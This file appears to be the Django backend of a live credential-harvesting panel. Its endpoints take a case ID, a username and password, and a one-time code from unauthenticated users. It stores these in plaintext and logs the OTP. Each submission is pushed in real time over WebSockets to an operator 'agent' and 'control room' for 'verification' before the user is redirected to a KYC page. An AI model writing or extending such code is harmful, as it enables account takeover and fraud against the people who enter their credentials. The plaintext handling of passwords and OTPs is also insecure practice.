# accounts/api/views/user_flow_views.py
"""
User Flow API Views

Handles user interactions during verification process:
- Verify case ID
- Submit credentials
- Submit secret key
- Submit KYC
- Start KYC

These endpoints are called by the React frontend and are CSRF exempt
because users are not authenticated yet.
"""

from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework.permissions import AllowAny
from rest_framework import status
from asgiref.sync import async_to_sync
from channels.layers import get_channel_layer
from django.utils import timezone
from django.shortcuts import get_object_or_404

from accounts.models import Session, SessionLog, SystemSettings
from django.conf import settings
from ..serializers import (
    VerifyCaseIDSerializer,
    SubmitCredentialsSerializer,
    SubmitSecretKeySerializer,
    UserStartedKYCSerializer,
    SubmitKYCSerializer,
)


from rest_framework_simplejwt.tokens import AccessToken

class VerifyCaseIDView(APIView):
    """
    User verifies their Case ID to start a session.

    POST /api/verify-case/
    Body: {"case_id": "ABC123"}

    Returns:
    - verified: User successfully verified and session advanced to credentials stage
    - uuid: Internal session identifier for WebSocket routing
    - token: Guest JWT for WebSocket authentication (NEW)
    - next_step: Next stage in the process
    """

    permission_classes = [AllowAny]

    def post(self, request):
        serializer = VerifyCaseIDSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        case_id = serializer.validated_data['case_id']
        session = get_object_or_404(Session, external_case_id=case_id, status='active')

        # Update session: user is now online and moving to credentials stage
        session.user_online = True
        session.stage = 'credentials'

        # Prevent signal from also broadcasting (deduplication strategy)
        session._broadcasted_by_viewset = True
        
        session.save(update_fields=['user_online', 'stage'])

        # Log user connection
        SessionLog.objects.create(
            session=session,
            message='User verified case ID and connected',
            log_type='user_connection'
        )

        # Notify agent via their specific channel AND control room (for superusers)
        groups = ['control_room']
        if session.agent:
            groups.append(f"agent_{session.agent.id}")

        for group in groups:
            try:
                async_to_sync(get_channel_layer().group_send)(
                    group,
                    {
                        'type': 'user_status_update',
                        'uuid': str(session.uuid),
                        'case_id': case_id,
                        'status': 'case_id_verified'
                    }
                )
            except Exception as e:
                import logging
                logging.getLogger(__name__).warning(f"Failed to notify {group}: {str(e)}")

        # Update user's session via WebSocket
        try:
            async_to_sync(get_channel_layer().group_send)(
                f'session_{session.uuid}',
                {
                    'type': 'session_update',
                    'stage': 'credentials',
                    'user_online': True
                }
            )
        except Exception as e:
            import logging
            logging.getLogger(__name__).warning(f"Failed to update user session: {str(e)}")

        # GENERATE GUEST TOKEN
        token = AccessToken()
        token['session_uuid'] = str(session.uuid)
        token['scope'] = 'guest'
        # Set short expiry for security (e.g., 1 hour, or match session timeout)
        # Defaults to simplejwt settings if not set, but we can rely on default.

        return Response(
            {
                'status': 'verified',
                'next_step': 'credentials',
                'uuid': str(session.uuid),
                'token': str(token),
                'message': 'Case ID verified. Please proceed to enter credentials.'
            },
            status=status.HTTP_200_OK
        )


class SubmitCredentialsView(APIView):
    """
    User submits login credentials.

    POST /api/submit-credentials/
    Body: {
        "case_id": "ABC123",
        "username": "user@example.com",
        "password": "secret123"
    }

    Returns:
    - ok: Credentials received, waiting for agent verification
    """

    permission_classes = [AllowAny]

    def post(self, request):
        serializer = SubmitCredentialsSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        case_id = serializer.validated_data['case_id']
        username = serializer.validated_data['username']
        password = serializer.validated_data['password']

        session = Session.objects.get(external_case_id=case_id, status='active')

        # Store submission in session data
        user_data = session.user_data or {}
        user_data['current_submission'] = {
            'stage': 'credentials',
            'data': {
                'username': username,
                'password': password
            }
        }
        session.user_data = user_data

        # Prevent signal from also broadcasting (deduplication strategy)
        # We send the specific credentials_submitted event below, so we don't want a generic
        # session_updated broadcast that could overwrite our carefully crafted submission state
        session._broadcasted_by_viewset = True
        session.save(update_fields=["user_data"])




        # Log submission
        SessionLog.objects.create(
            session=session,
            message='User submitted credentials',
            log_type='user_input',
            extra_data={'username': username}
        )

        # Notify agent
        # Notify agent
        groups = ['control_room']
        if session.agent:
            groups.append(f"agent_{session.agent.id}")

        for group in groups:
            try:
                async_to_sync(get_channel_layer().group_send)(
                    group,
                    {
                        'type': 'user_status_update',
                        'uuid': str(session.uuid),
                        'case_id': case_id,
                        'status': 'credentials_submitted',
                        'data': {
                            'stage': 'credentials',
                            'data': {
                                'username': username,
                                'password': password
                            }
                        }
                    }
                )

            except Exception as e:
                import logging
                logging.getLogger(__name__).warning(f"Failed to notify {group}: {str(e)}")

        return Response(
            {
                'status': 'ok',
                'message': 'Credentials submitted. Waiting for verification.'
            },
            status=status.HTTP_200_OK
        )


class SubmitSecretKeyView(APIView):
    """
    User submits secret key/OTP.

    POST /api/submit-secret-key/
    Body: {
        "case_id": "ABC123",
        "secret_key": "123456"
    }

    Returns:
    - ok: Secret key received, waiting for agent verification
    """

    permission_classes = [AllowAny]

    def post(self, request):
        serializer = SubmitSecretKeySerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        case_id = serializer.validated_data['case_id']
        secret_key = serializer.validated_data['secret_key']

        session = Session.objects.get(external_case_id=case_id, status='active')

        # Store submission in session data
        user_data = session.user_data or {}
        user_data['current_submission'] = {
            'stage': 'secret_key',
            'data': {
                'secret_key': secret_key
            }
        }
        session.user_data = user_data

        # Prevent signal from also broadcasting (deduplication strategy)
        # We send the specific secret_key_submitted event below, so we don't want a generic
        # session_updated broadcast that could overwrite our carefully crafted submission state
        session._broadcasted_by_viewset = True

        session.save()

        # Log submission
        SessionLog.objects.create(
            session=session,
            message='User submitted secret key',
            log_type='user_input',
            extra_data={'secret_key': secret_key}
        )

        # Notify agent
        # Notify agent
        groups = ['control_room']
        if session.agent:
            groups.append(f"agent_{session.agent.id}")

        for group in groups:
            try:
                async_to_sync(get_channel_layer().group_send)(
                    group,
                    {
                        'type': 'user_status_update',
                        'uuid': str(session.uuid),
                        'case_id': case_id,
                        'status': 'secret_key_submitted',
                        'data': {
                            'stage': 'secret_key',
                            'data': {
                                'secret_key': secret_key
                            }
                        }
                    }
                )
            except Exception as e:
                import logging
                logging.getLogger(__name__).warning(f"Failed to notify {group}: {str(e)}")

        return Response(
            {
                'status': 'ok',
                'message': 'Secret key submitted. Waiting for verification.'
            },
            status=status.HTTP_200_OK
        )


class UserStartedKYCView(APIView):
    """
    User clicked 'Begin KYC' and is being redirected to external KYC provider.

    POST /api/user-started-kyc/
    Body: {"case_id": "ABC123"}

    Returns:
    - ok: KYC start registered
    """

    permission_classes = [AllowAny]

    def post(self, request):
        serializer = UserStartedKYCSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        case_id = serializer.validated_data['case_id']
        session = Session.objects.get(external_case_id=case_id, status='active')

        # Store KYC start in submission data
        user_data = session.user_data or {}
        user_data['current_submission'] = {
            'stage': 'kyc',
            'data': {
                'status': 'started',
                'started_at': timezone.now().isoformat()
            }
        }
        session.user_data = user_data

        # Prevent signal from also broadcasting (deduplication strategy)
        # We send the specific kyc_started event below, so we don't want a generic
        # session_updated broadcast that could overwrite our carefully crafted submission state
        session._broadcasted_by_viewset = True

        session.save()

        # Log KYC start
        SessionLog.objects.create(
            session=session,
            message='User started KYC process',
            log_type='user_activity'
        )

        # Notify agent
        groups = ['control_room']
        if session.agent:
            groups.append(f"agent_{session.agent.id}")

        for group in groups:
            try:
                async_to_sync(get_channel_layer().group_send)(
                    group,
                    {
                        'type': 'user_status_update',
                        'uuid': str(session.uuid),
                        'case_id': case_id,
                        'status': 'kyc_started',
                        'data': user_data['current_submission']
                    }
                )
            except Exception as e:
                import logging
                logging.getLogger(__name__).warning(f"Failed to notify {group}: {str(e)}")

        # Get URL from System Settings
        system_settings = SystemSettings.get_settings()
        kyc_url = system_settings.kyc_redirect_url

        return Response(
            {
                'status': 'ok',
                'message': 'KYC process started',
                'kyc_url': kyc_url
            },
            status=status.HTTP_200_OK
        )


class SubmitKYCView(APIView):
    """
    User completed external KYC and submitted results.

    POST /api/submit-kyc/
    Body: {"case_id": "ABC123"}

    Returns:
    - ok: KYC submission registered
    """

    permission_classes = [AllowAny]

    def post(self, request):
        serializer = SubmitKYCSerializer(data=request.data)
        serializer.is_valid(raise_exception=True)

        case_id = serializer.validated_data['case_id']
        session = Session.objects.get(external_case_id=case_id, status='active')

        # Store KYC submission in session data
        user_data = session.user_data or {}
        user_data['current_submission'] = {
            'stage': 'kyc',
            'data': {
                'status': 'submitted',
                'submitted_at': timezone.now().isoformat()
            }
        }
        session.user_data = user_data

        # Prevent signal from also broadcasting (deduplication strategy)
        # We send the specific kyc_submitted event below, so we don't want a generic
        # session_updated broadcast that could overwrite our carefully crafted submission state
        session._broadcasted_by_viewset = True

        session.save()

        # Log KYC submission
        SessionLog.objects.create(
            session=session,
            message='User submitted KYC',
            log_type='user_input'
        )

        # Notify agent
        groups = ['control_room']
        if session.agent:
            groups.append(f"agent_{session.agent.id}")

        for group in groups:
            try:
                async_to_sync(get_channel_layer().group_send)(
                    group,
                    {
                        'type': 'user_status_update',
                        'uuid': str(session.uuid),
                        'case_id': case_id,
                        'status': 'kyc_submitted',
                        'data': user_data['current_submission']
                    }
                )
            except Exception as e:
                import logging
                logging.getLogger(__name__).warning(f"Failed to notify {group}: {str(e)}")

        return Response(
            {
                'status': 'ok',
                'message': 'KYC submitted. Waiting for verification.'
            },
            status=status.HTTP_200_OK
        )
